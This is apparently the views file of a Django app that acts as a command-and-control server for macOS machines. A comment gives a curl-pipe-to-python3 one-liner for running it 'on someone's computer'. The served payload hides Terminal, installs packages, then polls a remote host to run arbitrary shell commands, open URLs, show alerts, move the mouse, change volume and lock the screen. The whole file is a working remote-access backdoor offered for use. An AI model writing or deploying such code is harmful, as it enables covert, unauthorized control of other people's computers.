from django.shortcuts import render
from django.http import HttpResponse, JsonResponse
import sqlite3 
# Create your views here.

#RUN curl https://macnetback-nylr.c9users.io/getc | python3 to run on someone's computer 

# conn = sqlite3.connect("messages.db")
# c = conn.cursor()
# c.execute("DROP TABLE saved")
# c.execute('''CREATE TABLE IF NOT EXISTS saved (content TEXT, type INTEGER, id INTEGER)''')
# conn.commit()

from django.views.decorators.csrf import csrf_exempt

current_position = []
requested_position = []
uservolval = [0]

@csrf_exempt 
def messages(request):
    conn = sqlite3.connect("messages.db")
    c = conn.cursor() 
    if request.method == "POST": #posting from app
        data = request.POST["message"]
        dtype = request.POST["type"]
        did = request.POST["id"]
        c.execute("DELETE FROM saved")
        c.execute('''INSERT INTO saved VALUES (?, ?, ?)''', (data, dtype, did,))
        conn.commit() 
        return HttpResponse("OK")
    else: #reading from python script
        resp = []
        for element in c.execute("select content, type, id from saved"):
            resp.append({"message": element[0], "type": element[1], "id": element[2]})
        return JsonResponse(resp, safe=False)
    c.close()
          
def requestPurge(request):
    conn = sqlite3.connect("messages.db")
    c = conn.cursor() 
    c.execute("DELETE FROM saved")
    conn.commit()
    return HttpResponse("Done")
    
@csrf_exempt
def uservol(request): #get and post 
    if request.method == "POST":
        uservolval[0] = request.POST["message"]
        return HttpResponse("OK")
    else:
        return HttpResponse(str(uservolval[0]))
@csrf_exempt
def VolAndPos(request): #get and post 
    if request.method == "POST":
        if request.POST["source"] == "mobile":
            reqposdata = list(map(float, request.POST["message"].split(":")))
            requested_position.append(reqposdata[0])
            requested_position.append(reqposdata[1])
        elif request.POST["source"] == "comp":
            current_position[0] = request.POST["x"]
            current_position[1] = request.POST["y"]
        return HttpResponse("OK")
    if request.method == "GET":
        if len(requested_position) > 0:
            data = [{"x": requested_position[0], "y": requested_position[1]}]
            del requested_position[0]
            del requested_position[0]
            print(requested_position)
            return JsonResponse(data, safe=False)
        else:
            return JsonResponse([], safe=False)
            
@csrf_exempt 
def getc(request):
    return HttpResponse("""import os, sys
import time, requests, json
import subprocess 

os.system('''osascript -e 'tell application "System Events" to tell process "Terminal" to keystroke "h" using command down' ''')

os.system("pip install pyautogui")
os.system("pip install pyobjc-core")
os.system("pip install pyobjc-framework-Quartz")

os.system("pip3 install pyautogui")
os.system("pip3 install pyobjc-core")
os.system("pip3 install pyobjc-framework-Quartz") 



import pyautogui as pg

SIZE = pg.size()
SIZEX = SIZE[0]
SIZEY = SIZE[1]

def moveToLocation(x, y):
	pg.moveTo(x, y, 0.2)


def openURL(openurl):
	os.system('''osascript -e 'tell application "Safari" to activate' ''')
	os.system('''osascript -e 'tell application "Safari" to open location "{}"' '''.format(openurl))

def createAlert(text):
	os.system('''osascript -e 'tell application "Finder" to activate' ''')
	os.system('''osascript -e 'tell application "Finder" to display alert "{}"' '''.format(text))

def execute(cmd):
	os.system(cmd)

def cvol(newnum):
	os.system('''osascript -e 'set volume output volume {}' '''.format(newnum))

def getCurrent():
	return str(pg.position())

def disableComputer():
		os.popen('''osascript -e 'repeat 
						tell application "Preview" to activate 
						tell application "Safari" to activate
						tell application "Terminal" to activate
					end repeat' ''')

def enableComputer():
	os.system("killall osascript")

while True:
    try:
    	time.sleep(0.01)
    	r = requests.get("https://macnetback-nylr.c9users.io/")
    	r_mav = json.loads(requests.get("https://macnetback-nylr.c9users.io/volandpos").text)
    	r_vol = requests.get("https://macnetback-nylr.c9users.io/uvol").text  
    	cvol(r_vol)
    
    
    	if len(r_mav) > 0: #mouse related 
    		locdata = r_mav[0]
    		moveToLocation(locdata["x"]*SIZEX, locdata["y"]*SIZEY)

    	try:
    		data = json.loads(r.text)[0]
    	except:
    		continue
    	messageType = data["type"]
    	messageDirections = data["message"]
    	messageId = data["id"]
    
    	print(r_mav)
    	if messageType == 1: #open url 
    		openURL(messageDirections)
    	elif messageType == 2: #create alert 
    		createAlert(messageDirections)
    	elif messageType == 3: #execute
    		execute(messageDirections)
    	elif messageType == 4: #volume related 
    		pass 
    	elif messageType == 5:
    	    print(messageDirections)
    	    if messageDirections == "true":
    	        disableComputer()
    	    else:
    	        enableComputer()
    	elif messageType == 6:
    	    os.system("pmset displaysleepnow")
    	requests.get("https://macnetback-nylr.c9users.io/purge")
    except Exception as e:
        print(str(e))""", content_type="text/plain")
	
